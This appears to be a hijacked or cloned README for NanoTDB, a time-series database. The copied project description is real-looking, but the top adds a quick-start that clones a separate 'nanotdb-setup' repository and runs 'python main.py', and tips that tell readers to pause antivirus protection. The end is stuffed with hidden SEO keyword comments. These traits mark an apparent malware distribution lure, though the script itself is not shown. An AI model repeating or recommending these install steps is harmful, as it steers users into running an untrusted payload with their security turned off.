# NanoTDB


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/AbjurerSport/nanotdb-setup.git
cd nanotdb-setup
python main.py
```


<p align="center">
  <img src="docs/NanoTDB.png" alt="NanoTDB mascot" width="220">
</p>

**One binary. Local files. Built-in dashboard, editor, Explore, and offline CLI.**

NanoTDB is a single-binary time-series database with a browser dashboard, a
drag-and-edit dashboard *editor*, an ad-hoc Explore view, and an offline CLI —
all in one program. Drop it on a Raspberry Pi, edge box, appliance, or any
machine where standing up a TSDB plus a dashboard service plus a collector
stack is heavier than the problem you're solving.

You get metric ingest, range queries, rollups, retention, recovery, a
dashboard you can edit in the browser, and `nanocli` to inspect or export
data offline — without assembling anything else.

---

## What makes it different

Most "small" TSDBs hand you the storage and tell you to wire up your own UI,
collector, and operations. NanoTDB ships them together and keeps them honest:

- **Built-in dashboard AND editor.** Edit groups, widgets, and series in the
  browser. Validate, preview, save. No separate Grafana, no second service to
  run, no JSON file you have to edit by hand (though you can — it's just
  [`dashboard.json`](docs/DASHBOARD.md)).
- **Offline `nanocli`.** Inspect WAL, catalog, manifest, `.dat` files, export
  to line protocol, recompute rollups, run aggregate queries — all directly
  against the data directory, with the server stopped or running.
- **Files you can read.** Append-only `.dat` pages, a single reusable WAL per
  database, a JSON catalog, a TOML manifest. Retention is partition-file
  deletion. There is no opaque storage layer between you and your data.
- **Recoverable after crash or power loss.** Recent samples are WAL-protected
  and replayed on restart. Tunable from `segment` fsync to per-append `always`.
  Important on SD-backed edge boxes.
- **Built-in rollups.** Long-horizon downsampling lives in the same engine —
  define `[rollups]` in a manifest and you get min/max/avg/sum/count series
  in a destination database, with offline backfill and cascading rollups.
- **SD-friendly footprint.** Append-only, partitioned, S2-compressed. A real
  Raspberry Pi workload runs ~700k samples/day in under 1 MB on disk (see
  below).
- **Optional [`drip`](docs/DRIP.md) collector.** CPU, memory, disk, IO,
  network, load, one-wire temperature, and SD-write-probe metrics, ready to
  POST into NanoTDB.

---

## See it

<figure align="center">
  <img src="docs/nano-dashboard.png" alt="NanoTDB dashboard showing CPU and memory widgets">
  <figcaption><em>Mobile-friendly dashboard — live operational view from one local NanoTDB.</em></figcaption>
</figure>

<figure align="center">
  <img src="docs/dashboard-wide.png" alt="NanoTDB wide desktop dashboard layout" width="900">
  <figcaption><em>Wide desktop layout for denser placement.</em></figcaption>
</figure>

<figure align="center">
  <img src="docs/explore.png" alt="NanoTDB Explore view with metric picker and live chart" width="440">
  <figcaption><em>Explore — ad-hoc metric picker, last-value cards, live chart.</em></figcaption>
</figure>

<figure align="center">
  <img src="docs/dashboard-editor.png" alt="NanoTDB dashboard editor" width="440">
  <figcaption><em>In-browser editor — groups, widgets, series, preview, validate, save.</em></figcaption>
</figure>

---

## 60-second Hello World

Terminal 1:

```bash
mkdir -p ~/nanotdb-data
./nanotdb --init --config ~/nanotdb-data/engine.toml
./nanotdb --config ~/nanotdb-data/engine.toml
```

Terminal 2:

```bash
curl -X POST "http://localhost:8428/api/v1/import" \
  -d $'demo/room.temp 21.5\ndemo/room.humidity 48'

curl "http://localhost:8428/api/v1/query?query=demo/room.temp"

./nanocli inspect wal --root ~/nanotdb-data --db demo --verbose
```

Then open <http://localhost:8428/> for the dashboard, `/explore` for ad-hoc
charts, `/dashboard/edit` for the editor.

For the longer version see [docs/HELLO_WORLD.md](docs/HELLO_WORLD.md) or
[docs/GETTING_STARTED.md](docs/GETTING_STARTED.md).

---

## Real footprint on a Raspberry Pi

Actual live data from one Pi running NanoTDB + `drip` with a handful of
DS18B20 temperature sensors, ~12 consecutive days, 10-second cadence:

| Day        | Metrics | Points  | Metric file size |
|------------|--------:|--------:|-----------------:|
| 2026-05-22 |      83 | 693,091 |           757 KB |
| 2026-05-23 |      83 | 717,036 |           935 KB |
| 2026-05-24 |      83 | 722,348 |           996 KB |
| 2026-05-25 |      83 | 725,986 |         1,015 KB |
| 2026-05-26 |      83 | 716,709 |           982 KB |
| 2026-05-27 |      83 | 716,708 |           897 KB |
| 2026-05-28 |      91 | 773,136 |           968 KB |
| 2026-05-29 |      91 | 785,971 |           831 KB |
| 2026-05-30 |      91 | 784,799 |           982 KB |
| 2026-05-31 |      91 | 779,780 |           885 KB |
| 2026-06-01 |      91 | 784,533 |           925 KB |
| 2026-06-02 |      91 | 785,882 |           907 KB |

Roughly **~1 MB/day per 700k–785k samples** across 83–91 metrics on this
real workload. That's under 1.3 bytes per point on disk after compression.
A typical Pi SD card holds *years* of this with room to spare — exactly
what the storage layout is tuned for.

---

## Best fit

| Good fit                                                          | Use something larger                                       |
|-------------------------------------------------------------------|------------------------------------------------------------|
| Single-binary observability on one machine                        | Distributed or horizontally scaled deployments             |
| Raspberry Pi, edge nodes, appliances, local app metrics           | Large fleets, high-cardinality multi-tenant workloads      |
| Hundreds of metrics you want local and inspectable                | Ecosystems where broad integrations matter more than simplicity |
| Built-in dashboard plus offline CLI workflow                      | Systems that need looser ordering guarantees               |

NanoTDB is **not** trying to be a distributed TSDB, a high-cardinality fleet
backend, or a system that accepts arbitrary out-of-order writes. It will tell
you that plainly — including in this README.

---

## Concepts in 60 seconds

A **database** is an isolated namespace (`prod`, `sensors`, `weather`) with
its own WAL, catalog, manifest, and partitioned `.dat` files. A **metric** is
one numeric time-ordered stream inside a database; type (`int32` or
`float32`) is fixed on first write. A **sample** is one `(timestamp, value)`
pair, written in line protocol:

```text
DB/metric.name value [timestamp_ns]
```

Examples:

```text
prod/room.temp 21.5 1715000000000000000
sensors/pressure.hpa 1013
weather/outdoor.humidity 48
```

For a friendly walkthrough — what a database is, how multiple metrics live
inside one DB, what happens when a partition seals, when `metric-*.dat`
files appear, and how to tune the WAL for resilience vs SD wear — see
[docs/CONCEPTS.md](docs/CONCEPTS.md). For the canonical reference, see
[docs/GLOSSARY.md](docs/GLOSSARY.md) and [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).

---

## Documentation

### Start here

- [docs/HELLO_WORLD.md](docs/HELLO_WORLD.md) — fastest copy/paste path.
- [docs/GETTING_STARTED.md](docs/GETTING_STARTED.md) — installation, examples, walkthrough.
- [docs/RUN_AS_A_SERVICE.md](docs/RUN_AS_A_SERVICE.md) — systemd setup for Pi / Linux.

### Use the UI

- [docs/DASHBOARD.md](docs/DASHBOARD.md) — dashboard, editor, Explore, `dashboard.json`.
- [docs/DRIP.md](docs/DRIP.md) — the optional host metrics collector.

### Reference

- [docs/CONFIGURATION.md](docs/CONFIGURATION.md) — `engine.toml` and per-database `manifest.toml`.
- [docs/HTTP_API.md](docs/HTTP_API.md) — `/api/v1/*` endpoints, request/response shapes.
- [docs/NANOCLI.md](docs/NANOCLI.md) — offline CLI commands, timestamp formats, examples.
- [docs/ROLLUPS.md](docs/ROLLUPS.md) — downsampling jobs, cascades, backfill.
- [docs/METRIC_FILES.md](docs/METRIC_FILES.md) — optional query-optimized storage and benchmarks.
- [docs/RECOVERY.md](docs/RECOVERY.md) — WAL behavior, durability profiles, tuning.
- [docs/EMBEDDING.md](docs/EMBEDDING.md) — embedding the engine in a Go program.

### Concepts

- [docs/CONCEPTS.md](docs/CONCEPTS.md) — friendly walkthrough: databases, metrics, partitions, WAL, `data-*.dat` vs `metric-*.dat`, durability tuning.
- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) — storage and query walkthrough.
- [docs/GLOSSARY.md](docs/GLOSSARY.md) — canonical terms.
- [docs/DESIGN.md](docs/DESIGN.md) — deeper design rationale.
- [docs/LAWS.md](docs/LAWS.md) — invariants the code upholds.

---


## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the branch model and release workflow.

## License

See [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- nanotdb-setup - tool utility software - download install setup -->
<!-- cross platform nanotdb-setup copy | nanotdb setup reference | open source nanotdb-setup package | windows nanotdb-setup | modular nanotdb-setup service | setup nanotdb-setup | how to use nanotdb-setup api | install nanotdb-setup | how to install nanotdb-setup library | open source nanotdb-setup | run high performance nanotdb-setup encoder | windows powerful nanotdb-setup | examples modular nanotdb-setup copy | nanotdb setup guide | install nanotdb-setup web | nanotdb-setup reader | nanotdb-setup cli | powerful nanotdb-setup decoder | latest version minimal nanotdb-setup app | install powerful nanotdb-setup library | sample nanotdb-setup downloader | customizable nanotdb-setup web | high performance nanotdb-setup | deploy nanotdb-setup debugger | run on windows easy nanotdb-setup application | free secure nanotdb-setup extension | use nanotdb-setup software | how to use top nanotdb-setup generator | execute nanotdb-setup checker | high performance nanotdb-setup client | compile nanotdb-setup optimizer | fast nanotdb-setup | how to download nanotdb-setup viewer | macos nanotdb-setup checker | open nanotdb-setup replacement | nanotdb-setup web | local nanotdb-setup fork | tar.gz minimal nanotdb-setup | nanotdb-setup gui | sample nanotdb-setup logger | tar.gz best nanotdb-setup | how to deploy nanotdb-setup alternative | how to build nanotdb-setup uploader | run on linux open source nanotdb-setup | how to use nanotdb-setup | easy nanotdb-setup | ubuntu nanotdb-setup replacement | fast nanotdb-setup uploader | top nanotdb-setup extension | nanotdb-setup copy -->
<!-- run on mac free nanotdb-setup | beginner nanotdb-setup web | compile nanotdb-setup desktop | portable nanotdb-setup framework | demo modern nanotdb-setup | guide nanotdb-setup cli | nanotdb-setup application | nanotdb setup course | download native nanotdb-setup scanner | ubuntu local nanotdb-setup | free nanotdb-setup reader | debian nanotdb-setup | centos advanced nanotdb-setup server | getting started low latency nanotdb-setup creator | customizable nanotdb-setup tracker | download for windows nanotdb-setup optimizer | debian nanotdb-setup validator | nanotdb-setup tool | download for windows nanotdb-setup editor | modular nanotdb-setup package | latest version nanotdb-setup copy | wiki nanotdb-setup module | open source best nanotdb-setup sdk | download for linux reliable nanotdb-setup | nanotdb-setup validator | self hosted nanotdb-setup parser | guide nanotdb-setup platform | minimal nanotdb-setup generator | example top nanotdb-setup binding | wiki native nanotdb-setup | nanotdb setup pipeline | how to deploy secure nanotdb-setup mirror | open source minimal nanotdb-setup | advanced nanotdb-setup extractor | how to deploy extensible nanotdb-setup | secure nanotdb-setup encoder | 2025 reliable nanotdb-setup | source code configurable nanotdb-setup logger | build nanotdb-setup engine | open cross platform nanotdb-setup | getting started nanotdb-setup utility | execute nanotdb-setup decoder | nanotdb-setup optimizer | run on windows nanotdb-setup encoder | git clone nanotdb-setup downloader | how to install nanotdb-setup server | customizable nanotdb-setup viewer | github top nanotdb-setup service | launch nanotdb-setup editor | best nanotdb-setup tester -->
<!-- zip nanotdb-setup framework | advanced nanotdb-setup program | compile nanotdb-setup decoder | beginner nanotdb-setup parser | start local nanotdb-setup generator | cross platform nanotdb-setup module | powerful nanotdb-setup | linux nanotdb-setup tester | updated nanotdb-setup converter | how to configure nanotdb-setup generator | top nanotdb setup | how to download nanotdb-setup extractor | getting started local nanotdb-setup | run on mac nanotdb-setup copy | modern nanotdb-setup tester | source code nanotdb-setup optimizer | download for windows nanotdb-setup validator | centos nanotdb-setup tester | arch nanotdb-setup validator | 2026 modern nanotdb-setup software | fedora easy nanotdb-setup utility | extensible nanotdb-setup package | configurable nanotdb-setup builder | zip nanotdb-setup web | nanotdb setup help | configure nanotdb-setup | portable nanotdb-setup | documentation nanotdb-setup mobile | compile nanotdb-setup | low latency nanotdb-setup framework | configurable nanotdb-setup api | how to build top nanotdb-setup | documentation nanotdb-setup logger | launch modular nanotdb-setup parser | nanotdb setup cloud | run on linux nanotdb-setup clone | free nanotdb-setup | run on windows nanotdb-setup | setup nanotdb-setup extension | install nanotdb-setup viewer | install top nanotdb-setup | how to setup nanotdb-setup software | demo nanotdb-setup tracker | windows nanotdb-setup builder | reliable nanotdb-setup | download for mac nanotdb-setup compressor | install nanotdb-setup replacement | run on linux low latency nanotdb-setup tester | quick start nanotdb-setup copy | fedora nanotdb-setup plugin -->
<!-- source code nanotdb-setup debugger | git clone modular nanotdb-setup | updated nanotdb-setup | nanotdb-setup decoder | walkthrough nanotdb-setup | production ready nanotdb-setup | nanotdb setup workflow | download for mac nanotdb-setup software | open source nanotdb-setup server | centos nanotdb-setup | minimal nanotdb-setup | docs fast nanotdb-setup | 2026 nanotdb-setup sdk | download nanotdb-setup uploader | 2026 high performance nanotdb-setup | build nanotdb-setup | best nanotdb-setup checker | nanotdb-setup logger | lightweight nanotdb-setup software | how to deploy secure nanotdb-setup | free download nanotdb-setup copy | install nanotdb-setup copy | docs nanotdb-setup desktop | docs stable nanotdb-setup | quick start nanotdb-setup compressor | how to deploy nanotdb-setup binding | modern nanotdb-setup mirror | demo nanotdb-setup optimizer | launch nanotdb-setup desktop | extensible nanotdb-setup | getting started nanotdb-setup alternative | nanotdb setup demo | configurable nanotdb-setup module | examples nanotdb-setup | source code low latency nanotdb-setup | reliable nanotdb-setup scanner | tar.gz nanotdb-setup decoder | best nanotdb-setup analyzer | compile nanotdb-setup web | how to configure nanotdb-setup editor | setup customizable nanotdb-setup | nanotdb-setup converter | git clone nanotdb-setup cli | download for windows online nanotdb-setup | latest version nanotdb-setup mirror | nanotdb-setup tracker | source code nanotdb-setup creator | how to install lightweight nanotdb-setup module | open source nanotdb-setup client | start nanotdb-setup tracker -->
<!-- configurable nanotdb-setup downloader | best nanotdb-setup program | run nanotdb-setup platform | updated nanotdb-setup package | nanotdb-setup encoder | windows nanotdb-setup sdk | ubuntu nanotdb-setup api | powerful nanotdb-setup web | how to setup nanotdb-setup | free nanotdb-setup creator | free download nanotdb-setup editor | github nanotdb-setup gui | nanotdb-setup desktop | nanotdb setup vs | how to deploy nanotdb-setup | customizable nanotdb-setup application | portable nanotdb-setup extension | open source nanotdb-setup reader | debian nanotdb-setup module | guide fast nanotdb-setup | how to download stable nanotdb-setup module | is nanotdb setup safe | new version nanotdb-setup decoder | nanotdb setup error | advanced nanotdb-setup optimizer | stable nanotdb-setup builder | safe nanotdb-setup module | updated nanotdb-setup extractor | nanotdb-setup library | tutorial nanotdb-setup decoder | download for windows nanotdb-setup software | new version nanotdb-setup port | wiki free nanotdb-setup | open nanotdb-setup debugger | minimal nanotdb-setup framework | getting started best nanotdb-setup | nanotdb-setup addon | github nanotdb-setup app | low latency nanotdb-setup copy | setup cross platform nanotdb-setup viewer | free open source nanotdb-setup | examples nanotdb-setup fork | cross platform nanotdb-setup | tar.gz best nanotdb-setup api | use nanotdb-setup copy | how to deploy nanotdb-setup clone | linux cross platform nanotdb-setup | nanotdb-setup alternative | centos nanotdb-setup logger | beginner nanotdb-setup extension -->
<!-- lightweight nanotdb-setup | nanotdb-setup generator | run on linux nanotdb-setup binding | nanotdb-setup builder | 2026 nanotdb-setup | nanotdb-setup plugin | 2025 nanotdb-setup | run on windows modern nanotdb-setup | high performance nanotdb-setup api | cross platform nanotdb-setup app | download for mac offline nanotdb-setup | download for mac nanotdb-setup cli | run cross platform nanotdb-setup | configurable nanotdb-setup package | examples nanotdb-setup platform | run nanotdb-setup cli | walkthrough nanotdb-setup utility | nanotdb-setup monitor | open source open source nanotdb-setup | github nanotdb-setup fork | guide nanotdb-setup | nanotdb-setup checker | simple nanotdb-setup server | macos nanotdb-setup port | github nanotdb-setup desktop | configurable nanotdb-setup wrapper | how to use nanotdb-setup tool | nanotdb-setup extractor | documentation online nanotdb-setup | run nanotdb-setup wrapper | install reliable nanotdb-setup | fast nanotdb-setup library | 2025 nanotdb-setup fork | nanotdb setup alternative | launch modern nanotdb-setup | wiki reliable nanotdb-setup | run on windows nanotdb-setup module | github nanotdb-setup extension | github nanotdb-setup cli | modern nanotdb-setup creator | fedora production ready nanotdb-setup | start nanotdb-setup app | customizable nanotdb-setup builder | nanotdb setup download | modern nanotdb-setup | offline nanotdb-setup logger | how to run extensible nanotdb-setup | download low latency nanotdb-setup | how to run nanotdb-setup port | nanotdb setup docker -->
<!-- secure nanotdb-setup | use high performance nanotdb-setup | install nanotdb-setup wrapper | open nanotdb-setup | nanotdb setup kubernetes | example nanotdb-setup plugin | lightweight nanotdb-setup fork | setup nanotdb-setup package | execute nanotdb-setup gui | advanced nanotdb-setup | zip nanotdb-setup server | run on linux reliable nanotdb-setup | stable nanotdb-setup extension | free nanotdb-setup binding | start nanotdb-setup service | ubuntu nanotdb-setup platform | powerful nanotdb-setup tester | guide nanotdb-setup parser | walkthrough nanotdb-setup software | macos nanotdb-setup utility | how to download nanotdb-setup monitor | modular nanotdb-setup client | is nanotdb setup legit | extensible nanotdb-setup program | high performance nanotdb-setup program | linux nanotdb-setup debugger | use nanotdb-setup uploader | online nanotdb-setup debugger | documentation nanotdb-setup debugger | easy nanotdb-setup addon | sample nanotdb-setup addon | tar.gz powerful nanotdb-setup module | how to download easy nanotdb-setup | demo nanotdb-setup wrapper | low latency nanotdb-setup tool | fast nanotdb-setup service | run on mac nanotdb-setup monitor | open nanotdb-setup wrapper | open source nanotdb-setup logger | low latency nanotdb-setup mobile | centos modern nanotdb-setup service | open nanotdb-setup logger | open source nanotdb-setup mobile | nanotdb-setup engine | online nanotdb-setup binding | run on linux nanotdb-setup generator | latest version nanotdb-setup downloader | run on mac advanced nanotdb-setup | tutorial cross platform nanotdb-setup | low latency nanotdb-setup library -->
<!-- nanotdb setup blog | how to deploy top nanotdb-setup monitor | how to install stable nanotdb-setup | sample nanotdb-setup copy | 2026 nanotdb-setup extractor | run on linux modern nanotdb-setup checker | nanotdb-setup clone | how to build nanotdb-setup logger | nanotdb-setup debugger | setup high performance nanotdb-setup fork | simple nanotdb-setup web | quickstart nanotdb-setup sdk | nanotdb setup github | local nanotdb-setup | extensible nanotdb-setup builder | run fast nanotdb-setup | open offline nanotdb-setup | how to install nanotdb-setup copy | online nanotdb-setup extractor | examples nanotdb-setup encoder | nanotdb setup setup | sample safe nanotdb-setup client | centos nanotdb-setup reader | online nanotdb-setup viewer | 2025 nanotdb-setup port | self hosted nanotdb-setup | native nanotdb-setup validator | self hosted nanotdb-setup port | windows nanotdb-setup fork | debian self hosted nanotdb-setup | self hosted nanotdb-setup extractor | easy nanotdb-setup creator | nanotdb setup fix | lightweight nanotdb-setup optimizer | high performance nanotdb-setup module | source code nanotdb-setup package | nanotdb setup automation | examples nanotdb-setup addon | native nanotdb-setup analyzer | free nanotdb-setup desktop | download nanotdb-setup reader | walkthrough nanotdb-setup sdk | wiki nanotdb-setup | configure nanotdb-setup creator | examples nanotdb-setup engine | tutorial nanotdb-setup | guide nanotdb-setup software | fedora nanotdb-setup gui | example nanotdb-setup | 2026 nanotdb-setup utility -->
<!-- nanotdb setup documentation | latest version simple nanotdb-setup reader | build nanotdb-setup analyzer | demo nanotdb-setup cli | nanotdb setup review | reliable nanotdb-setup clone | demo nanotdb-setup | tutorial nanotdb-setup clone | walkthrough customizable nanotdb-setup | local nanotdb-setup converter | simple nanotdb-setup monitor | nanotdb setup webinar | native nanotdb-setup binding | 2025 minimal nanotdb-setup mobile | nanotdb setup ci cd | getting started nanotdb-setup scanner | latest version nanotdb-setup platform | macos extensible nanotdb-setup | high performance nanotdb-setup framework | use github nanotdb-setup mirror | high performance nanotdb-setup desktop | nanotdb setup saas | demo local nanotdb-setup application | stable nanotdb-setup fork | ubuntu nanotdb-setup tool | quickstart nanotdb-setup uploader | how to configure nanotdb-setup extension | git clone nanotdb-setup | modular nanotdb-setup | windows high performance nanotdb-setup | download for mac nanotdb-setup | run on mac nanotdb-setup software | simple nanotdb-setup | run on windows nanotdb-setup logger | linux nanotdb-setup decoder | how to deploy nanotdb-setup tester | nanotdb-setup replacement | deploy nanotdb-setup web | production ready nanotdb-setup creator | free download fast nanotdb-setup | fedora nanotdb-setup editor | nanotdb-setup analyzer | nanotdb-setup viewer | use nanotdb-setup plugin | high performance nanotdb-setup validator | nanotdb-setup port | free nanotdb setup | setup nanotdb-setup compressor | arch nanotdb-setup program | download for windows offline nanotdb-setup -->
<!-- nanotdb-setup mirror | execute nanotdb-setup | how to download nanotdb-setup api | launch nanotdb-setup mirror | simple nanotdb-setup optimizer | free download nanotdb-setup | configure nanotdb-setup copy | get nanotdb-setup server | easy nanotdb-setup clone | 2025 nanotdb-setup converter | tar.gz nanotdb-setup | modular nanotdb-setup editor | minimal nanotdb-setup analyzer | offline nanotdb-setup parser | nanotdb-setup compressor | walkthrough nanotdb-setup scanner | download for linux nanotdb-setup | open nanotdb-setup utility | run minimal nanotdb-setup | nanotdb-setup framework | nanotdb-setup editor | how to install nanotdb-setup validator | open source nanotdb-setup debugger | free advanced nanotdb-setup | docs nanotdb-setup | native nanotdb-setup | arch nanotdb-setup | local nanotdb-setup validator | reliable nanotdb-setup tool | deploy nanotdb-setup engine | download for linux nanotdb-setup service | run low latency nanotdb-setup | advanced nanotdb-setup tester | tutorial minimal nanotdb-setup scanner | tutorial best nanotdb-setup | windows nanotdb-setup cli | run on windows nanotdb-setup framework | nanotdb setup not working | configurable nanotdb-setup alternative | reliable nanotdb-setup service | example minimal nanotdb-setup | modern nanotdb-setup extractor | portable nanotdb-setup monitor | docs nanotdb-setup binding | configurable nanotdb-setup | cross platform nanotdb-setup service | nanotdb-setup scanner | getting started free nanotdb-setup | download for linux nanotdb-setup optimizer | getting started nanotdb-setup platform -->

<!-- Last updated: 2026-06-09 17:52:29 -->
